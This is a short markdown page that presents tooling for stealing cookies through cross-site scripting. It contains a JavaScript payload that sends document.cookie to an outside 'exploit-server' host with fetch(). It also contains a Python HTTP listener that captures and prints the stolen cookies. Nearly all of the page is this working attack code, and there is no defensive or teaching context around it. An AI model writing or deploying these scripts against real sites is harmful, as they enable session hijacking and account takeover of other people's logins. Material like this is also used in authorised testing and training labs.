# Python and JavaScript Scripts for XSS Cookie Exfiltration

Exfiltration payloads and scripts for capturing cookies via XSS vulnerabilities.

---

## 1. JavaScript Exfiltration Payload (Exploit Server Delivery)

```javascript
// Exfiltrate document.cookie to remote listener
fetch('https://exploit-server.net/log?cookie=' + encodeURIComponent(document.cookie));
```

---

## 2. Python Listener Script

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class XSSLogHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        if "cookie" in params:
            print(f"[!] STOLEN COOKIE: {params['cookie'][0]}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

def run(port=8080):
    print(f"[*] XSS Listener active on port {port}...")
    server = HTTPServer(("0.0.0.0", port), XSSLogHandler)
    server.serve_forever()

if __name__ == "__main__":
    run()
```
